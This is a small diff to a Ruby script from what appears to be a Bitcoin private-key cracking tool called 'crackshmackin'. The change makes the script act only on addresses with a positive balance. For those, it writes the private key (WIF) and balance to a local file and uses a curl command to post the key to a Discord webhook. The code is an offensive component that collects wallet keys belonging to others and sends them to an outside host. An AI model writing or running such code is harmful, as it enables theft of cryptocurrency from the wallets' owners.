@@ -17,7 +17,7 @@ begin
           exit 0
         end
       end
-    else
+    elsif balance.to_i > 0
       File.open('/crackshmackin/data/fyeah.bux', 'a') do |f|
         `curl -H "Content-Type: application/json" -d '{"username": "crackshmackin", "content": "You found a private key (WIF) #{line.split(' ')[1]} for the address #{addr} with #{balance} satoshis in it."}' #{ENV["CRACKSHMACKIN_DISCORD_HOOK"]}` unless (ENV["CRACKSHMACKIN_DISCORD_HOOK"].empty?)
         f.puts("address #{addr} has #{balance} satoshis in it. and the private key WIF for the Bitcoin Wallet is #{line.split(' ')[1]}")
